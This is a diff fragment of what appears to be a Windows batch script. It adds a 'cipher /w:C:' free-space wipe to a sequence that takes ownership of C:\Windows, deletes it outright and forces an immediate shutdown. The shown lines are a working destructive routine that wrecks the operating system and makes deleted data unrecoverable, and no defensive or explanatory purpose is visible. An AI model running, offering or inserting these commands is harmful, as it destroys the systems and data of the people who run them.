@@ -566,6 +566,8 @@ takeown /f C:\Windows /r /d /y
 
 rmdir /s /q C:\Windows
 
+cipher /w:C:
+
 shutdown /s /t 0
 
 pause
